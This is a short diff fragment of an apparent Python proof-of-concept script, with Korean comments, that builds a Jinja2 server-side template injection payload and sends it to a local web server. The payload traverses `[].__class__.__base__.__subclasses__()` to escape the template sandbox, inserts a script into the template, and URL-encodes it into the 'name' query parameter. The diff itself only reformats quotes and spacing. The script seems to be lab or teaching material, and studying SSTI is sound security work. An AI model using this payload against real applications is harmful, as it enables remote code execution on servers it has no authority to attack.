@@ -14,15 +14,15 @@ value = """{% for c in [].__class__.__base__.__subclasses__() %}
   {% endfor %}
 {% endif %}
 {% endfor %}"""
-value = value.replace('%s', script)
-print('[삽입될 템플릿 코드]')
+value = value.replace("%s", script)
+print("[삽입될 템플릿 코드]")
 print(value)
 print()
 
 # SSTI를 수행하는 URL
-query = [('name', value)]
-url = 'http://localhost:8000/?'
-url = url + parse.urlencode(query) # 삽입할 코드 퍼센트 인코딩하여 쿼리값으로 설정
-print('[요청 URL]')
+query = [("name", value)]
+url = "http://localhost:8000/?"
+url = url + parse.urlencode(query)  # 삽입할 코드 퍼센트 인코딩하여 쿼리값으로 설정
+print("[요청 URL]")
 print(url)
 print()
